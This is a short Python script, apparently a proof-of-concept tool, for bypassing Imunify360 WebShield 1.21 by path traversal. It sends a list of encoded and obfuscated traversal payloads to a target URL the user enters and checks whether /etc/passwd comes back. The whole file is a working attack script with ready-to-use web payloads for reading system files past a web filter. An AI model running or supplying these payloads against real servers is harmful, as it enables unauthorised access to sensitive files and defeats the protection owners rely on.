import requests

def print_banner():
    print("=" * 60)
    print("      Imunify360 WebShield 1.21 Bypass Tester")
    print("                 m10sec                      ")
    print("        CVE: Path Traversal Custom Bypass    ")
    print("=" * 60)

# Lista de payloads conocidos para intentar el bypass
payloads = [
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
    "/..%2f..%2f..%2fetc/passwd",
    "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "//..//..//..//etc/passwd",
    "/..;/..;/..;/etc/passwd",
    "/../../../../etc/passwd%00",
    "/../../../../etc/passwd.",
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "/etc/passwd..log",
    "/etc/passwd;/"
]

def test_payloads(base_url):
    success = False

    for payload in payloads:
        url = base_url.rstrip("/") + payload
        print(f"\n[>] Probando: {url}")

        try:
            response = requests.get(url, timeout=10)
            if "root:" in response.text:
                print("[✓] Bypass exitoso con payload:")
                print(payload)
                success = True
                break
            else:
                print("[x] Filtro activo o no vulnerable.")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error de conexión: {e}")

    if not success:
        print("\n[!] No se encontró ningún bypass exitoso con los payloads disponibles.")

def main():
    print_banner()
    target = input("Introduce la URL del objetivo (ej: http://target.com): ").strip()

    if not target.startswith("http://") and not target.startswith("https://"):
        print("Error: La URL debe comenzar con http:// o https://")
        return

    test_payloads(target)

if __name__ == "__main__":
    main()
